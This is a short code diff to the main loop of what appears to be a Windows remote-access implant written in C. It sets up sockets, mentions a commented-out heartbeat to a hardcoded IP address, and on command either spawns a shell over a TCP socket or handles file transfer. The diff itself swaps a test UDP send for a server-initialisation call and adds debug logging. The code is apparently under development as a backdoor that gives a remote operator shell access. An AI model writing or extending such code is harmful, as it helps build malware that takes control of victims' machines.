@@ -36,6 +36,7 @@ int __cdecl main(int argc, char **argv)
     SOCKET ListenSocket = INVALID_SOCKET;
     SOCKET sock_tcp = INVALID_SOCKET;
     SOCKET sock_udp = INVALID_SOCKET;
+    int INIT = 0;
     SOCKADDR_IN sa;
     PROCESS_INFORMATION pi;
     __sock_TCP = &sock_tcp;
@@ -55,12 +56,6 @@ int __cdecl main(int argc, char **argv)
         return 1;
     }
 
-    DBGLG("socket is: ", sock_udp);
-    if (sendto(sock_udp, "hi", 3, 0, (SOCKADDR *)&sa, sizeof(sa)) < 0){
-        printf("Sending failed %d", WSAGetLastError());
-        closesocket(sock_udp);
-        return 1;
-    }
     // if (SetupServerUDP(&socku_s, ad_info.sin_port) < 0){
     //     DBGLG("Server set up failed: ", WSAGetLastError());
     //     closesocket(sock_udp);
@@ -70,7 +65,9 @@ int __cdecl main(int argc, char **argv)
     // iResult = HeartBeat("45.143.93.119", &__heartbeat);
     // printf("Initial heartbeat sent\n");
     // DBGLG("thread started: ", iResult);
-
+    if (InitServer(sock_udp, &sa) <0){
+        exit(1);
+    }
 
     /* TODO: Start a thread for heartbeating [UDPIpSetup, Connect, HeartBeat, Close]*/
     while (1){
@@ -96,6 +93,7 @@ int __cdecl main(int argc, char **argv)
                 }
                 Shell(pi, sock_tcp);
                 closesocket(sock_tcp);
+                DBGLG("Closing shell\n");
                 break;
             case _SIG_FILE:
                 DBGLG("Got FILE\n");
